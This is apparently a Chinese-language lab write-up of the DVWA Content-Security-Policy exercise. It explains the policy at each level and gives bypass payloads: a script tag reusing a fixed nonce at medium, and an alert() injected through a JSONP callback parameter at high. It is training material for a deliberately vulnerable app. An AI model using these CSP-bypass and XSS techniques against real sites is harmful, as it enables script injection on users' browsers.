# DVWA-CSP




## low

通过 HTTP 头信息的 Content-Security-Policy



```
Content-Security-Policy: 

//这是 CSP 中的一个指令，用于定义浏览器允许加载 JavaScript 脚本的来源。
script-src 

//表示当前网站的域名。这允许网页中的 JavaScript 从与当前网页相同的域名加载。
'self'

//可加載的
https://pastebin.com 
hastebin.com 
www.toptal.com 
example.com 
code.jquery.com 
https://ssl.google-analytics.com 
https://digi.ninja ;
```

官方給的:
```
https://digi.ninja/dvwa/alert.js

//內容
alert("CSP Bypassed");
```















## medium 

通过 HTTP 头信息的 Content-Security-Policy 但開啟 unsafe-inline

```


- `Content-Security-Policy`: 这是 CSP 的声明，表明以下内容是关于内容安全策略的规则。

- `script-src`: 这是 CSP 中的一个指令，用于指定浏览器允许加载页面中的 JavaScript 脚本的来源。

- `'self'`: 表示当前网站的域名，允许从当前网站加载 JavaScript。

- `'unsafe-inline'`: 允许在 HTML 内联（即直接写在 HTML 中的）包含 JavaScript 代码。这个指令会降低安全性，因为它允许恶意脚本在页面中执行。

- `'nonce-TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA='`: 这是一个 nonce（一次性数字）值，它是由服务器生成的随机字符串，用于指定允许加载的脚本的特定来源。在这里，nonce 值是 `TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=`。这个值被服务器发送给浏览器，并且只有在包含这个特定 nonce 的脚本才能被执行。

总的来说，这条 CSP 规则允许页面加载来自当前网站的 JavaScript、内联的 JavaScript 代码以及具有特定 nonce 值的 JavaScript 脚本。

    
```

繞過
```
<script nonce="TmV2ZXIgZ29pbmcgdG8gZ2l2ZSB5b3UgdXA=">
    alert("xss");
</script>

```




## high


- jsonp 通常用於跨域拿資料


button 觸發 jsonp.請求
```
http://dvwa.com/vulnerabilities/csp/source/jsonp.php?callback=solveSum
```

返回
```
solveSum({"answer":"15"})
```



找到相關JS代碼，簡單說明就是請求jsonp 拿到 15 
```
http://dvwa.com/vulnerabilities/csp/source/high.js




// 創建一個函數 clickButton，用於創建並添加一個新的 script 元素到頁面，並設置其 src 屬性為 "source/jsonp.php?callback=solveSum"。
// 這將觸發 JSONP 請求，該請求將返回一個包含解答的對象，然後調用 solveSum 函數處理這個對象。
function clickButton() {
    var s = document.createElement("script");
    s.src = "source/jsonp.php?callback=solveSum";
    document.body.appendChild(s);
}

// 定義 solveSum 函數，該函數將處理從 JSONP 請求返回的對象，如果對象中包含 "answer" 屬性，則將其值設置為 id 為 "answer" 的元素的內容。
function solveSum(obj) {
    if ("answer" in obj) {
        document.getElementById("answer").innerHTML = obj['answer'];
    }
}

// 查找 id 為 "solve" 的按鈕元素。
var solve_button = document.getElementById("solve");

// 如果找到 solve_button 元素，則添加一個點擊事件監聽器，當按鈕被點擊時，將調用 clickButton 函數。
if (solve_button) {
    solve_button.addEventListener("click", function() {
        clickButton();
    });
}


```


了解以後，

```
這個
GET /vulnerabilities/csp/source/jsonp.php?callback=solveSum


會產生
<script src="source/jsonp.php?callback=solveSum">solveSum({"answer":"15"})</script>
```



XSS
```
這個
GET /vulnerabilities/csp/source/jsonp.php?callback=alert('xss')


會產生
<script src="source/jsonp.php?callback=solveSum">alert('xss')({"answer":"15"})</script>
```


不過利用的話，可能比較有難度，這題他是叫我們直接修改 jsonp.php，那我不直接上馬。











## impossible


```
You can never trust anything that comes from the user or prevent them from messing with it and so there is no impossible level. 
```